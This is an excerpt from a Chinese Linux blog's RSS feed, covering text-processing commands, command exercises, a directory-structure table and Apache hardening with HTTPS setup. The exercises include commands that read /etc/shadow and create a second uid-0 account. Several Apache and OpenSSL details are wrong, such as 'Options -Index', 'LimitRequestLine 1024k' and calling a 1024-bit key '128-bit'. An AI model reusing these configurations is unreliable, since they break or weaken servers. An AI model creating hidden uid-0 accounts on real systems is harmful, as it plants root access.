<h2 id="常用的文本处理命令" tabindex="-1"> 常用的文本处理命令</h2>
<h3 id="tr-命令" tabindex="-1"> tr 命令</h3>
<p>tr 命令可以用来删除一段文本信息中的某些文字。或者将其进行转换 使用方式:</p>
<div><pre><code><span>tr</span> <span>[</span>option<span>]</span><span>..</span>.SET1 <span>[</span>SET2<span>]</span>
</code></pre><div aria-hidden="true"><div></div></div></div><p>常用选项:</p>
<table>
<thead>
<tr>
<th>选项</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>-d</strong></td>
<td>删除和 set1 匹配的字符, 注意不是全词匹配也不是按字符顺序匹配</td>
</tr>
<tr>
<td><strong>-s</strong></td>
<td>去除 set1 指定的在输入文本中连续并重复的字符</td>
</tr>
</tbody>
</table>
<p><code>操作举例: </code></p>
<div><pre><code><span># 删除 "hello shiyanlou" 中所有的'o','l','h'</span>
<span>echo</span> <span>'hello shiyanlou'</span> <span>|</span> <span>tr</span> -d <span>'olh'</span>

<span># 将"hello" 中的ll,去重为一个l</span>
<span>echo</span> <span>'hello'</span> <span>|</span> <span>tr</span> -s <span>'l'</span>

<span># 将输入文本,全部转换为大写或小写输出</span>
<span>cat</span> /etc/passwd <span>|</span> <span>tr</span> <span>'[:lower:]'</span> <span>'[:upper:]'</span>
<span># 上面的'[:lower:]' '[:upper:]'你也可以简单的写作'[a-z]' '[A-Z]',当然反过来将大写变小写也是可以的</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="col-命令" tabindex="-1"> col 命令</h3>
<p>col 命令可以将 Tab 换成对等数量的空格建, 或反转这个操作. 用来格式化代码超爽 使用方式:</p>
<div><pre><code>col <span>[</span>option<span>]</span>
</code></pre><div aria-hidden="true"><div></div></div></div><p>常用的选项有:</p>
<table>
<thead>
<tr>
<th>选项</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>-x</strong></td>
<td>将 Tab 转换为空格</td>
</tr>
<tr>
<td><strong>-h</strong></td>
<td>将空格转换为 Tab（默认选项）</td>
</tr>
</tbody>
</table>
<p><code>操作举例: </code></p>
<div><pre><code><span># 查看/etc/protocols中的不可见字符,可以看到很多^I,这其实就是Tab键转义成可见字符的符号</span>
<span>cat</span> -A /etc/protocols

<span># 使用col -x将/etc/protocols中的Tab转换为空格,然后再使用cat查看,你发现^I不见了</span>
<span>cat</span> /etc/protocols <span>|</span> col -x <span>|</span> <span>cat</span> -A
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div></div></div><h2 id="福利-使用-wget-克隆网站" tabindex="-1"> 福利-使用 wget 克隆网站</h2>
<div><pre><code><span>wget</span> -c -m -k -np -p -E -U Mozilla –no-check-certificate <span>[</span>URL<span>]</span>
</code></pre><div aria-hidden="true"><div></div></div></div>]]></content:encoded>
      <enclosure url="https://vxhly.github.io/assets/liunx-basic-1.png" type="image/png"/>
    </item>
    <item>
      <title>Liunx 命令练习</title>
      <link>https://vxhly.github.io/views/liunx/liunx-command-testing.html</link>
      <guid>https://vxhly.github.io/views/liunx/liunx-command-testing.html</guid>
      <source url="https://vxhly.github.io/rss.xml">Liunx 命令练习</source>
      <description>前言
简单的一些 Liunx 命令练习。

</description>
      <category>liunx</category>
      <pubDate>Sun, 03 Sep 2017 20:46:08 GMT</pubDate>
      <content:encoded><![CDATA[<div><p>前言</p>
<p>简单的一些 Liunx 命令练习。</p>
</div>

<h2 id="【文件的压缩和解压缩】" tabindex="-1"> 【文件的压缩和解压缩】</h2>
<div><p>需求</p>
<p>使用 tar 命令将 <code>/etc</code> 目录打包至 <code>/tmp</code> 目录下（仅打包, 不压缩）, 将打包后的文件, 以 <code>gzip</code> 方式压缩【共两条命令】</p>
</div>
<div><pre><code><span>tar</span> -cvf /tmp/etc.tar /etc
<span>gzip</span> /tmp/etc.tar
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><h2 id="【创建软链接和硬链接】" tabindex="-1"> 【创建软链接和硬链接】</h2>
<div><p>需求</p>
<p>给系统文件 <code>/etc/profile</code> 创建一个软链接 <code>lnsprofile</code> 和一个硬链接 <code>lnhprofile</code>【共两条命令】</p>
</div>
<div><pre><code><span>ln</span> -s /etc/profile ./lnsprofile
<span>ln</span> /etc/profile ./lnhprofile
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><h2 id="【为文件设置隐藏属性】" tabindex="-1"> 【为文件设置隐藏属性】</h2>
<div><p>需求</p>
<p>为文件 <code>test</code> 设置隐藏属性, 要求其只能无法写入数据, 也无法删除它【共一条命令】</p>
</div>
<div><pre><code>chattr +a <span>test</span>
<span># or</span>
chattr +i <span>test</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div></div></div><h2 id="【创建目录和删除目录】" tabindex="-1"> 【创建目录和删除目录】</h2>
<div><p>需求</p>
<p>创建目录 <code>./test/2017/6/25</code>, 并切换目录至 <code>./test/2017/6</code>, 删除空目录 ./25（不能使用 rm -rf）【共三条命令】</p>
</div>
<div><pre><code><span>mkdir</span> -p ./test/2017/6/25
<span>cd</span> ./test/2017/6
<span>rmdir</span> ./25
</code></pre><div aria-hidden="true"><div></div><div></div><div></div></div></div><div><p>需求</p>
<p>查看当前所在的目录【共一条命令】</p>
</div>
<div><pre><code><span>pwd</span>
</code></pre><div aria-hidden="true"><div></div></div></div><div><p>需求</p>
<p>查看当前目录下有哪些文件或目录（包括隐藏文件）【共一条命令】</p>
</div>
<div><pre><code><span>ls</span> -la
</code></pre><div aria-hidden="true"><div></div></div></div><h2 id="【普通用户提权】" tabindex="-1"> 【普通用户提权】</h2>
<div><p>需求</p>
<p>普通用户切换成 root 超级用户【举例两个】</p>
</div>
<div><pre><code><span>sudo</span> <span>su</span>
<span># or</span>
<span>su</span> -
<span># or</span>
<span>sudo</span> -s
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div></div></div><h2 id="【创建用户和用户组】" tabindex="-1"> 【创建用户和用户组】</h2>
<div><p>需求</p>
<p>创建一个用户 stuxxx, 其家目录为 <code>/home/stu</code>, 备注信息为 &quot;this is student, ID is xxxxxx&quot;, 登录 shell 为 <code>/sbin/nologi</code>n, 并设置登陆密码【共三条命令】</p>
</div>
<div><pre><code><span>useradd</span> -d /home/stu -m -c <span>"this is student,ID is xxxxxx"</span> -s /sbin/nologin -p <span>""</span> stuxxx
</code></pre><div aria-hidden="true"><div></div></div></div><div><p>需求</p>
<p>创建一个 uid 为 0 的用户 student【共一条命令】</p>
</div>
<div><pre><code><span>useradd</span>  -o  -u  <span>0</span>  student
</code></pre><div aria-hidden="true"><div></div></div></div><div><p>需求</p>
<p>创建用户组 test【共一条命令】</p>
</div>
<div><pre><code><span>groupadd</span> <span>test</span>
</code></pre><div aria-hidden="true"><div></div></div></div><h2 id="【用户管理】" tabindex="-1"> 【用户管理】</h2>
<div><p>需求</p>
<p>锁定用户 stuxxx, 使其不能登陆系统【共一条命令】</p>
</div>
<div><pre><code><span>usermod</span> -s /sbin/nologin stu2xxx
<span># or</span>
<span>passwd</span> -l stu2xxx
</code></pre><div aria-hidden="true"><div></div><div></div><div></div></div></div><h2 id="【新建文件】" tabindex="-1"> 【新建文件】</h2>
<div><p>需求</p>
<p>新建一个文件 file, 添加内容 &quot;this is text, ID is xxxxxx&quot;, 设置其权限为 000【共三条命令】</p>
</div>
<div><pre><code><span>touch</span> <span>file</span>
<span>echo</span> <span>"this is text,ID is xxxxxx"</span> <span>></span> <span>file</span>
<span>chmod</span> 000 <span>file</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div></div></div><h2 id="【文件的快速搜索】" tabindex="-1"> 【文件的快速搜索】</h2>
<div><p>需求</p>
<p>在 <code>/etc</code> 目录下搜索 apache、ssh、ftp 的配置文件【共三条命令】</p>
</div>
<div><pre><code><span>find</span> /etc -type f -iname <span>'*apache2.*'</span>
<span>find</span> /etc -type f -iname <span>'*ssh.*'</span>
<span>find</span> /etc -type f -iname <span>'*ftp.*'</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div></div></div><h2 id="【文件的查看和快速定位】" tabindex="-1"> 【文件的查看和快速定位】</h2>
<div><p>需求</p>
<p>查看 <code>/etc/passwd</code> 文件和 <code>/etc/shadow</code> 文件, 并使用 grep 过滤出 student 用户的信息【共两条命令】</p>
</div>
<div><pre><code><span>cat</span> /etc/passwd <span>|</span> <span>grep</span> <span>'student'</span>
<span>cat</span> /etc/shadow <span>|</span> <span>grep</span> <span>'student'</span>
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><h2 id="【更改目录或者文件的属性】" tabindex="-1"> 【更改目录或者文件的属性】</h2>
<div><p>需求</p>
<p>将目录 <code>./test/\*</code> 的所有者和所有组修改成 student【共一条命令】</p>
</div>
<div><pre><code><span>chown</span> -R student:student ./test/
</code></pre><div aria-hidden="true"><div></div></div></div><h2 id="【系统环境变量的查看与配置】" tabindex="-1"> 【系统环境变量的查看与配置】</h2>
<div><p>需求</p>
<p>查看当前的系统环境变量配置【共两条命令】</p>
</div>
<div><pre><code><span>env</span>
<span># or</span>
<span>echo</span> <span>$PATH</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div></div></div><div><p>需求</p>
<p>将 <code>/tmp</code> 目录添加至系统 <code>$PATH</code> 变量中【共一条命令】</p>
</div>
<div><pre><code><span><span>PATH</span></span><span>=</span><span>$PATH</span>:/tmp
</code></pre><div aria-hidden="true"><div></div></div></div><h2 id="【iptables-规则】" tabindex="-1"> 【iptables 规则】</h2>
<div><p>需求</p>
<p>设置 iptables 规则, 只允许 80 端口和 22 端口通过防火墙【共两条命令】</p>
</div>
<div><pre><code>iptables -A INPUT -p tcp --dport <span>22</span> -j ACCEPT
iptables -A INPUT -p tcp --dport <span>80</span> -j ACCEPT
</code></pre><div aria-hidden="true"><div></div><div></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>Liunx 学习笔记（一）目录结构说明</title>
      <link>https://vxhly.github.io/views/liunx/liunx-directory-structure.html</link>
      <guid>https://vxhly.github.io/views/liunx/liunx-directory-structure.html</guid>
      <source url="https://vxhly.github.io/rss.xml">Liunx 学习笔记（一）目录结构说明</source>
      <description>前言
接触了 Liunx 也有一段时间了, 也算对 Liunx 有一定的了解, 在这里将陆续的推出 Liunx 的学习笔记系列, 做个记录, 方便以后忘记有处可循。Liunx 是以文件系统为主的, 所以 Liunx 下的每一个目录都有其各自的作用, 则本篇将介绍 Liunx 的各个目录结构及其说明。

</description>
      <category>liunx</category>
      <pubDate>Thu, 08 Sep 2016 19:35:12 GMT</pubDate>
      <content:encoded><![CDATA[<div><p>前言</p>
<p>接触了 Liunx 也有一段时间了, 也算对 Liunx 有一定的了解, 在这里将陆续的推出 Liunx 的学习笔记系列, 做个记录, 方便以后忘记有处可循。Liunx 是以文件系统为主的, 所以 Liunx 下的每一个目录都有其各自的作用, 则本篇将介绍 Liunx 的各个目录结构及其说明。</p>
</div>

<h2 id="目录结构图" tabindex="-1"> 目录结构图</h2>
<p><img src="/assets/liunx-directory-structure.png" alt="目录结构图"></p>
<h2 id="目录结构说明" tabindex="-1"> 目录结构说明</h2>
<table>
<thead>
<tr>
<th>目录</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>/</strong></td>
<td>根目录。在 <code>Windows</code> , <code>DOS</code> 或者其他类似的操作系统里面, 每个分区都会有一个相应的根目录。但是 <code>Linux</code> 和其他 <code>UNIX</code> 系统则把所有的文件都放在一个目录树里面, <code>/</code> 就是唯一的根目录。一般来讲, 根目录下面很少保存什么文件, 或者只有一个内核映像在这里。</td>
</tr>
<tr>
<td><strong>/boot</strong></td>
<td>很多 <code>Linux</code> 系统把内核映像和其他一些和启动有关的文件都放在这里。</td>
</tr>
<tr>
<td><strong>/tmp</strong></td>
<td>一般只有启动时产生的临时文件才会放在这个地方。我们自己的临时文件都放在 <code>/var/tmp</code> 。</td>
</tr>
<tr>
<td><strong>/mnt</strong></td>
<td>这个目录下面放着一些用来安装其他设备的子目录, 比如说 <code>/mnt/cdrom</code> 或者 <code>/mnt/floppy</code> 。在有些 <code>Linux</code> 中这个目录被 <code>/mount</code> 代替。</td>
</tr>
<tr>
<td><strong>/lib</strong></td>
<td>启动的时候所要用到的库文件都放在这个目录下。那些非启动用的库文件都会放在 <code>/usr/lib</code> 下。内核模块是放在 <code>/lib/modules/</code> （内核版本）下的。</td>
</tr>
<tr>
<td><strong>/proc</strong></td>
<td>这个目录在磁盘上其实是不存在的。里面的文件都是关于当前系统的状态, 包括正在运行的进程、硬件状态、内存使用的多少等。</td>
</tr>
<tr>
<td><strong>/dev</strong></td>
<td>这个目录下保存着所有的设备文件。里面有一些是由 <code>Linux</code> 内核创建的用来控制硬件设备的特殊文件。</td>
</tr>
<tr>
<td><strong>/var</strong></td>
<td>这里有一些被系统改变过的数据。比如说 <code>/var/tmp</code> , 就是用来储存临时文件的。还有很多其他的进程和模块把它们的记录文件也放在这个地方, 包括如下一些重要的子目录</td>
</tr>
<tr>
<td><strong>/var/log</strong></td>
<td>这里放着绝大部分的记录文件。随着时间的增长, 这个目录会变得很庞大, 所以要定期清理。</td>
</tr>
<tr>
<td><strong>/var/run</strong></td>
<td>包括了各种运行时的信息。</td>
</tr>
<tr>
<td><strong>/var/lib</strong></td>
<td>包括了一些系统运行时需要的文件。</td>
</tr>
<tr>
<td><strong>/var/spool</strong></td>
<td>邮件, 新闻, 打印序列的所在地。</td>
</tr>
<tr>
<td><strong>/root</strong></td>
<td><code>root</code> 用户的主目录。</td>
</tr>
<tr>
<td><strong>/home</strong></td>
<td>一般用户的主目录都会放在这个目录下。在 <code>Linux</code> 下, 可以通过 <code>#cd ~</code> 来进入自己的主目录。</td>
</tr>
<tr>
<td><strong>/etc</strong></td>
<td>这里保存着绝大部分的系统配置文件。相对来讲, 单个用户的系统配置文件会保存在这个用户自己的主目录里面。下面列举其中一些重要的子目录。</td>
</tr>
<tr>
<td><strong>/etc/X11</strong></td>
<td>这里放着 X 窗口系统（ <code>Linux</code> 中的图形用户界面系统）所需要的配置文件。 <code>XF86Config</code> 就是把配置储存到这个地方的。 <code>/etc/X11/fonts</code> 里面放着一些服务器需要的字体, 还存放一些窗口管理器存放的配置文件。</td>
</tr>
<tr>
<td><strong>/etc/init.d</strong></td>
<td>这个目录保存着启动描述文件, 包括各种模块和服务的加载描述。所以如果不清楚的话, 千万不要随便删除其中的文件, 这里存放的文件都是系统自动进行配置的, 不需要用户配置。</td>
</tr>
<tr>
<td><strong>/etc/rcS.d</strong></td>
<td>这里放着一些连接到 <code>/etc/init.d</code> 的文件, 根据 <code>runlevel</code> 的不同而执行相应的描述。这里的文件名都是由 <code>S</code> 来开头的, 然后是一个两位的数字----表示各种服务启动的顺序。比如, <code>S24foo</code> 就是在 <code>S42bar</code> 前面执行的。接着就是相应的连接到 <code>/etc/init.d</code> 下面的文件名字了。</td>
</tr>
<tr>
<td><strong>/etc/rc0.d - /etc/rc6.d</strong></td>
<td>这里面也是一些连接文件, 和 <code>/etc/rcS.d</code> 差不多。不同的是, 这些只会在指定的 <code>runlevel</code> 下运行相应的描述。 <code>0</code> 表示关机, <code>6</code> 表示重启。所有以 <code>K</code> 开头的文件表示关闭, 所有以 <code>S</code> 开头的文件表示重启。目前来讲, 文件的命名方式和 <code>/etc/rcS.d</code> 是一样的。</td>
</tr>
<tr>
<td><strong>/bin, /sbin</strong></td>
<td>这里分别放着启动时所需要的普通程序和系统程序。很多程序在启动以后也很有用, 它们放在这个目录下是因为它们经常要被其他程序调用。</td>
</tr>
<tr>
<td><strong>/usr</strong></td>
<td>这是一个很复杂、庞大的目录。除了上述目录之外, 几乎所有的文件都存放在这下面。下面列举其中一些重要的子目录。</td>
</tr>
<tr>
<td><strong>/usr/X11R6, /usr/X11, /usr/Xfree86</strong></td>
<td>这里保存着 X 窗口系统所需要的文件, 它的目录结构和 <code>/usr</code> 是一样的。</td>
</tr>
<tr>
<td><strong>/usr/bin</strong></td>
<td>二进制可执行文件存放的目录, 这里放着绝大部分的应用程序。</td>
</tr>
<tr>
<td><strong>/usr/sbin</strong></td>
<td>这里放着绝大部分的系统程序。</td>
</tr>
<tr>
<td><strong>/usr/games</strong></td>
<td>游戏程序和相应的数据会放在这里。</td>
</tr>
<tr>
<td><strong>/usr/include</strong></td>
<td>这个目录保存着 <code>C</code> 和 <code>C++</code> 的头文件。</td>
</tr>
<tr>
<td><strong>/usr/lib</strong></td>
<td>启动时用不到的库文件都会放在这里。</td>
</tr>
<tr>
<td><strong>/usr/info</strong></td>
<td>这里保存着 <code>GNU Info</code> 程序所需要的数据。</td>
</tr>
<tr>
<td><strong>/usr/man</strong></td>
<td>这里保存着 <code>man</code> 程序所需要的数据。</td>
</tr>
<tr>
<td><strong>/usr/src</strong></td>
<td>这里保存着源代码文件。</td>
</tr>
<tr>
<td><strong>/usr/doc</strong></td>
<td>这里保存着各种文档文件。这些文件可以帮助你了解 <code>Linux</code> , 解决问题和提供一些技巧。</td>
</tr>
<tr>
<td><strong>/usr/local</strong></td>
<td>这里保存着本地计算机所需要的文件。在用户进行远程访问的时候特别有意义。这个目录在有些 <code>Linux</code> 系统下就是一个单独的分区, 存放一些这台机子所属的那个用户的文件。里面的结构和 <code>/usr</code> 是一样的。</td>
</tr>
<tr>
<td><strong>/usr/shared, /usr/share</strong></td>
<td>这里保存着各种共享文件。</td>
</tr>
</tbody>
</table>
]]></content:encoded>
      <enclosure url="https://vxhly.github.io/assets/liunx-directory-structure.png" type="image/png"/>
    </item>
    <item>
      <title>Liunx 服务配置笔记（四）APACHE 服务安全配置</title>
      <link>https://vxhly.github.io/views/liunx/liunx-service-apache.html</link>
      <guid>https://vxhly.github.io/views/liunx/liunx-service-apache.html</guid>
      <source url="https://vxhly.github.io/rss.xml">Liunx 服务配置笔记（四）APACHE 服务安全配置</source>
      <description>前言
本篇是 Liunx 的服务配置笔记系列第四篇, 这一篇将具体介绍 Red Hat Liunx 下 APACHE 服务的安全配置。所谓 APACHE 就是一个 WEB 服务器, 为 WEB 网页提供服务。

</description>
      <category>liunx</category>
      <pubDate>Mon, 19 Sep 2016 14:58:33 GMT</pubDate>
      <content:encoded><![CDATA[<div><p>前言</p>
<p>本篇是 Liunx 的服务配置笔记系列第四篇, 这一篇将具体介绍 Red Hat Liunx 下 APACHE 服务的安全配置。所谓 APACHE 就是一个 WEB 服务器, 为 WEB 网页提供服务。</p>
</div>

<h2 id="配置文件的位置" tabindex="-1"> 配置文件的位置</h2>
<p>主配置文件: <strong>/etc/httpd/conf/httpd.conf</strong></p>
<h2 id="服务的启动与停止" tabindex="-1"> 服务的启动与停止</h2>
<div><p>提示</p>
<p>APACHE 的服务名并不叫做 <code>http</code> , 而是 <code>httpd</code> 。<br> 修改配置文件过后一定要重启 <code>httpd</code> 服务。</p>
</div>
<div><pre><code><span>service</span> httpd status        <span># 状态</span>
<span>service</span> httpd start         <span># 启动</span>
<span>service</span> httpd stop          <span># 暂停</span>
<span>service</span> httpd restart       <span># 重启</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div></div></div><h2 id="安全配置" tabindex="-1"> 安全配置</h2>
<h3 id="修改网站的根目录" tabindex="-1"> 修改网站的根目录</h3>
<p><code>Default Configuration:</code></p>
<div><pre><code>DocumentRoot <span>"/var/www/html"</span>
<span>&lt;</span>Directory <span>"/var/www/html"</span><span>></span>
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><div><p>提示</p>
<p>APACHE 默认配置的网站根目录是在 <code>/var/www/html</code> 下, 我们可以根据需求修改它。修改这个配置项的时候, 还需同时修改 <code>&lt;Directory &quot;/var/www/html&quot;&gt;</code> 这个配置项。</p>
</div>
<p>修改主配置文件</p>
<div><pre><code>DocumentRoot <span>"/mnt/www"</span>
<span>&lt;</span>Directory <span>"/mnt/www/"</span><span>></span>
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><h4 id="使用客户端进行验证" tabindex="-1"> 使用客户端进行验证</h4>
<p>验证之前, 请重启服务。使用浏览器打开即可。</p>
<p>验证之前, 还需创建网站存放的目录, 然后在创建一个测试的网页进行测试。</p>
<p><code>For Example:</code></p>
<div><pre><code><span>mkdir</span> /mnt/www/
<span>echo</span> <span>"this is test."</span> <span>>></span> /mnt/www/index.html
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><p>接下来, 在浏览器里输入你的服务器的 <code>IP</code> 地址就可以访问了。<br></p>
<p><img src="/assets/liunx-apache-2.png" alt="APACHE 服务安全配置"></p>
<h3 id="配置目录的别名" tabindex="-1"> 配置目录的别名</h3>
<p>修改主配置文件</p>
<p>目录别名设置, 就是浏览器访问 <code>http://[host]/test</code> 时, 实际上访问的是 <code>/var/www/html/test</code> 目录。</p>
<div><pre><code>Alias /test <span>"/var/www/html/test"</span>

<span>&lt;</span>Directory<span>></span>
  Options Indexes
  Order allow,deny
  allow from all
<span>&lt;</span>/Directory<span>></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p><img src="/assets/liunx-apache-3.png" alt="APACHE 服务安全配置"></p>
<h4 id="使用客户端进行验证-1" tabindex="-1"> 使用客户端进行验证</h4>
<p>验证之前, 请重启服务。使用浏览器打开即可。这时候就需要跟上目录名了。</p>
<p>验证之前, 还需要创建测试目录和测试网站文件。</p>
<p><code>For Example:</code></p>
<div><pre><code><span>mkdir</span> /var/www/html/test
<span>echo</span> <span>"dir dir dir dir."</span> <span>>></span> /var/www/html/index.html
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><p>接下来, 在浏览器里输入 <code>IP/test</code> 就可以访问了。注意大小写敏感。<br></p>
<p><img src="/assets/liunx-apache-4.png" alt="APACHE 服务安全配置"></p>
<h3 id="关闭版本信息的显示" tabindex="-1"> 关闭版本信息的显示</h3>
<p><code>Default Configuration:</code></p>
<div><pre><code>ServerSignature On
</code></pre><div aria-hidden="true"><div></div></div></div><p>如果你访问一个不存在的目录, 默认是会显示 APACHE 的版本信息, 这是很不安全的, 建议关掉, 注意大小写敏感。还可以设置为 <code>Off</code> 和 <code>EMail</code> 。其中 <code>Off</code> 是隐藏信息, <code>EMail</code> 是会显示管理员的 email 信息的。</p>
<p>修改主配置文件</p>
<div><pre><code>ServerSignature Off
</code></pre><div aria-hidden="true"><div></div></div></div><h4 id="使用客户端进行验证-2" tabindex="-1"> 使用客户端进行验证</h4>
<p>先看一下, 没有进行修改之前会显示什么吧！随便写一个目录, 访问它吧！</p>
<p><img src="/assets/liunx-apache-5.png" alt="APACHE 服务安全配置"></p>
<p>修改好配置之后, 重新访问, 再次看一下有没有吧！</p>
<p><img src="/assets/liunx-apache-6.png" alt="APACHE 服务安全配置"></p>
<h3 id="禁用目录浏览、符号连接追踪" tabindex="-1"> 禁用目录浏览、符号连接追踪</h3>
<p><code>Default Configuration:</code></p>
<div><pre><code><span>&lt;</span>Directory <span>"/var/www/html"</span><span>></span>
  Options Index FollowSymLinks
  AllowOverride None
  Order allow,deny
  Allow from all
<span>&lt;</span>/Directory<span>></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p><code>Index</code> 是定义是否开启目录浏览, 默认开启, 要关闭只需添加 <code>-</code> ； <code>FollowSymLinks</code> 是定义是否符号连接追踪, 默认开启, 要关闭只需添加 <code>-</code> 。</p>
<p>修改主配置文件</p>
<p>由于之前修改过网站根目录, 所以在这里直接使用。</p>
<div><pre><code><span>&lt;</span>Directory <span>"/mnt/html"</span><span>></span>
  Options -Index -FollowSymLinks
  AllowOverride None
  Order allow,deny
  Allow from all
<span>&lt;</span>/Directory<span>></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p><img src="/assets/liunx-apache-7.png" alt="APACHE 服务安全配置"></p>
<h4 id="使用客户端进行验证-3" tabindex="-1"> 使用客户端进行验证</h4>
<ul>
<li>配置禁用目录浏览, 说白了就是当一个目录下没有类似于 <code>index.php</code> 、 <code>index.html</code> 、 <code>default.php</code> 、 <code>defaule.html</code> 等这样子的主页, APACHE 默认会把该目录下的目录结构给列出来, 禁用就是阻止其列出。</li>
<li>配置禁用符号连接追踪, 说白了就是防止某个用户偶然创建的一个符号连接指向文件爱呢系统的某一部分。</li>
<li>配置白名单, 其实就是限制一些 IP 地址, 让其不能访问 APACHE。</li>
<li>这些配置, 在实际使用的过程中才会有体会, 这里就不再进行测试了。</li>
</ul>
<h3 id="开启白名单" tabindex="-1"> 开启白名单</h3>
<p><code>Default Configuration:</code></p>
<div><pre><code><span>&lt;</span>Directory <span>"/var/www/html"</span><span>></span>
  Options Index FollowSymLinks
  AllowOverride None
  Order allow,deny
  Allow from all
<span>&lt;</span>/Directory<span>></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p>直接修改 <code>Allow from</code> 这一项, <code>Allow from</code> 是定义白名单, 默认是允许所有 IP 地址访问, 要限制只需把 <code>all</code> 替换成允许访问的 IP 地址就好。</p>
<p>修改主配置文件</p>
<div><pre><code><span>&lt;</span>Directory <span>"/mnt/html"</span><span>></span>
  Options -Index -FollowSymLinks
  AllowOverride None
  Order allow,deny
  Allow from <span>192.168</span>.1.0/24
<span>&lt;</span>/Directory<span>></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="限制-http-请求包上限" tabindex="-1"> 限制 http 请求包上限</h3>
<p>HTTP 协议包包含请求包和应答包。HTTP 请求包(GET、POST 等请求方法)由三个部分构成, 分别是: <code>方法-URI-协议/版本</code> , 请求头即请求正文；HTTP 应答包和 HTTP 请求包相似, 由三个部分构成, 分别是: <code>协议-状态代码-描述</code> , 应答头即应答正文。</p>
<h4 id="limitrequestline-指令" tabindex="-1"> LimitRequestLine 指令</h4>
<p>设置 HTTP 请求行的字节数限制。</p>
<p>LimitRequestLine 指令允许服务器管理员增加或减少客户端 HTTP 请求行允许大小的限制。因为请求行包括 HTTP 方法、URI、协议版本, 所以 LimitRequestLine 指令会限制请求 URI 的长度。服务器会需要这个值足够大以装载它所有的资源名, 包括可能在 GET 请求中所传递的查询部分的所有信息。</p>
<p>这个指令给了服务器管理员更大的可控性以控制客户端不正常的请求行为。这有助于避免某些形式的拒绝服务攻击。</p>
<h4 id="limitrequestfieldsize-指令" tabindex="-1"> LimitRequestFieldSize 指令</h4>
<p>指定 HTTP 请求头允许的字节大小。</p>
<p>LimitRequestFieldSize 指令允许服务器管理员增加或减少 HTTP 请求头域大小的限制。一般来说, 服务器需要此值足够大, 以适应普通客户端的任何请求的头域大小。一个普通头域的大小对于不同的客户端来说是有很大差别的, 一般与用户配置他们的浏览器以支持更多的内容协议密切相关。SPNEGO 的认证头最大可能达到 12392 字节。</p>
<p>这个指令给了服务器管理员更大的可控性以控制客户端不正常的请求行为。这有助于避免某些形式的拒绝服务攻击。</p>
<h4 id="示例配置" tabindex="-1"> 示例配置</h4>
<p>默认配置中是没有 LimitRequestLine 指令和 LimitRequestFieldSize 指令, 需要手动添加</p>
<div><pre><code>LimitRequestLine 1024k
LimitRequestFieldSize 1024k
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><p><img src="/assets/liunx-apache-15.png" alt="APACHE 服务安全配置"></p>
<h2 id="配置-https" tabindex="-1"> 配置 https</h2>
<p>HTTPS 协议是由 SSL+HTTP 协议构建的可进行加密传输、身份认证的网络协议要比 http 协议安全。</p>
<h3 id="生成密钥" tabindex="-1"> 生成密钥</h3>
<div><pre><code>openssl genrsa <span>1024</span> <span>></span> server.key
</code></pre><div aria-hidden="true"><div></div></div></div><p>这是用 128 位 rsa 算法生成密钥, 得到 <code>server.key</code> 文件</p>
<h3 id="生成证书请求文件" tabindex="-1"> 生成证书请求文件</h3>
<div><pre><code>openssl req -new -key server.key <span>></span> server.csr
</code></pre><div aria-hidden="true"><div></div></div></div><p>这是用上面的密钥生成证书请求文件 <code>server.csr</code></p>
<h3 id="生成证书" tabindex="-1"> 生成证书</h3>
<div><pre><code>openssl req -x509 -days <span>365</span> -key server.key -in server.csr <span>></span> server.crt
</code></pre><div aria-hidden="true"><div></div></div></div><p>这是用前面生成的密钥和证书请求生成证书 <code>server.crt</code> , -days 参数指明证书有效期, 单位为天</p>
<h3 id="生成证书和密钥的例子" tabindex="-1"> 生成证书和密钥的例子</h3>
<p>注意路径, 记住它。</p>
<p><img src="/assets/liunx-apache-9.png" alt="APACHE 服务安全配置"></p>
<h3 id="确认是否安装-ssl-模块" tabindex="-1"> 确认是否安装 ssl 模块</h3>
<p>只要确定系统中有 <code>mod_ssl.so</code> 文件, 就可以确定已经安装好 ssl 模块。记住路径吧！</p>
<div><pre><code><span>find</span> / -iname <span>"*mod_ssl.so*"</span>    <span># 使用 find 命令进行搜索</span>
</code></pre><div aria-hidden="true"><div></div></div></div><p><img src="/assets/liunx-apache-8.png" alt="APACHE 服务安全配置"></p>
<h3 id="配置-httpd-ssl-conf-文件" tabindex="-1"> 配置 httpd-ssl.conf 文件</h3>
<p>注意在此文件中配置证书和密钥, 注意路径, 这里就使用上面的路径。</p>
<p>系统中可能没有此文件, 可以先创建它, <code>For Example:</code></p>
<div><pre><code><span>vim</span> /etc/httpd/conf/httpd-ssl.conf
</code></pre><div aria-hidden="true"><div></div></div></div><p>修改主配置文件, 添加如下内容, <code>For Example:</code></p>
<div><pre><code>SSLCertificateFile /home/server.crt
SSLCertificateKeyFile /home/server.key
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><h3 id="配置-httpd-conf-文件" tabindex="-1"> 配置 httpd.conf 文件</h3>
<h4 id="虚拟机设置" tabindex="-1"> 虚拟机设置</h4>
